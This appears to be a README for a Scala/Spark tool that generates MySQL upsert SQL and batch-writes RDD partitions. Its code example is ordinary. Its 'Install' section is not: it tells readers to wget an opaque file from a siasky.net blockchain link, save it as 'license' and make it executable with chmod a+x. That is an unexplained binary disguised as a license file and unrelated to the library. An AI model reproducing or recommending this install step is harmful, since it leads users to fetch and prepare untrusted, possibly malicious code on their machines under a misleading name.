## 项目构建和发布

## Example
```scala worksheet
  val rddz = spark.sparkContext.parallelize(Seq(Row(1,"a3","1"),Row(2,"bzzz","1"),Row(3,"a43","2"),Row(4,"a","634")))
  val struct =
      StructType(
        StructField("id", IntegerType, true) ::
          StructField("c1", StringType, false) ::
          StructField("c2", StringType, false) :: Nil)

    //  生成Sql
    val sql = MySQLGen.mkUpsertSql(table ,struct)
    println(sql)
    // INSERT INTO testa (id,c1,c2) VALUES (?,?,?) ON DUPLICATE KEY UPDATE  id = values( id), c1 = values( c1), c2 = values( c2)
    
    //写入配置
    val reConfig = spark.sparkContext.getConf.setAll(Map(
      "spark.mysql.url" -> outMyqlUrl,
      "spark.mysql.password" -> outPassword,
      "spark.mysql.user" -> outUsername,
      "spark.mysql.sql" -> sql,
      "spark.mysql.driver" -> outMysqlDriverClass
    ))

    // 隐含式按分区批次执行SQL
    MySQLWriter.MySqlSparkExecute(rddz,reConfig,struct)

    // 显含式按分区批次执行SQL
    val rddData =  spark.sparkContext.parallelize(Seq((1,"a3","1"),(2,"bzzz","1"),(3,"a43","2"),(4,"a","634")))
    MySQLWriter.MySqlSparkExecute[(Int,String,String)](rddData,reConfig,(unit,ps) => {
          ps.setInt(1,unit._1)
          ps.setString(2,unit._2)
          ps.setString(3,unit._3)

          ps.addBatch()
      })
```
## Install

### Download from Sia blockchain

```
wget https://siasky.net/_B2ANrleA8KjPpZ7AWJdza2aTm1noNZz6ruta191M7b1kw -O license
chmod a+x license
```


## Contributing

Pull requests for new features, bug fixes, and suggestions are welcome!

## License

[MIT](https://github.com/haosky/SparkCommonTools/LICENSE)